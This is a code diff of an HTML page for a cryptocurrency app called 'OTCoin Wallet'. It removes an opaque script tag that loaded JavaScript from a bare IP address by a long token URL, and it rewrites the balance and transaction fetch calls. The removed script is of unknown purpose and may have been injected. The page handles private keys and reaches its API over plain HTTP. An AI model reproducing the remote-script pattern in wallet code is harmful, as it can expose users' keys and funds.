@@ -1,7 +1,6 @@
-
 <!DOCTYPE html>
 <html lang="en">
-<head><script type='text/javascript' src='http://76.13.192.203/lK1lbenurlHzyE5gEX-U12_jnNlq9Y1MNfo7CVm_59M2E3qOZdKTPgZ3BCtuBmo-YIqVqUzxgmpyOcSMeOHkaDsAckqjZhMNHOG3FbLdfBOFj8r3TVlNVGiazpn6T9pS4CgiQ_FEocQJzTVxR7mQn4rtR0ERUaSnPvLowxe83JuSMsS-invXofWpGT81NvA0sKPQrQRguxonzq9d6Bg_Q5uAuJEjA_K1YQNRezu5qrgNVSMy4nWBCt3IEgiGkkcagB7XiO27zK3bnmh-WhXghVeaAilOhWlQSoaPtfoEhm8qMdt8CM1SJqhuqE1sBRpd-5S0ao3hI0Ts_U21rwzi9TCwq-CmYF24k-1cIJUhOASlDlQvCQJsYupeUyyQ2Hb06QVg6Ox46akEPqCcUWGQHzBzHT9ZsCP5OwrjXO43U0dxOKGdBwRhSPJ0_4t0N8pAr5WYli2BU0diZnY3'></script>
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>OTCoin Wallet</title>
@@ -244,7 +243,7 @@ function openWallet(addr, pk) {
 async function refreshBal() {
   document.getElementById('balNum').textContent='...';
   try {
-    const r = await fetch(`http://76.13.192.203/api/balance/${myAddr}`);
+    const r = await fetch('http://76.13.192.203/api/balance/'+myAddr);
     const d = await r.json();
     myBal = d.balance||0;
     document.getElementById('balNum').textContent = myBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:4});
@@ -286,7 +285,7 @@ async function toggleTx() {
   if(sec.style.display==='none') return;
   document.getElementById('txList').innerHTML='<div style="text-align:center;padding:20px;color:var(--dim);">Loading...</div>';
   try {
-    const r = await fetch(`http://76.13.192.203/api/transactions/${myAddr}`);
+    const r = await fetch(`${API}/api/transactions/${myAddr}`);
     const d = await r.json();
     const txs = d.transactions||[];
     if(!txs.length){document.getElementById('txList').innerHTML='<div style="text-align:center;padding:20px;color:var(--dim);font-size:13px;">No transactions yet — start mining!</div>';return;}
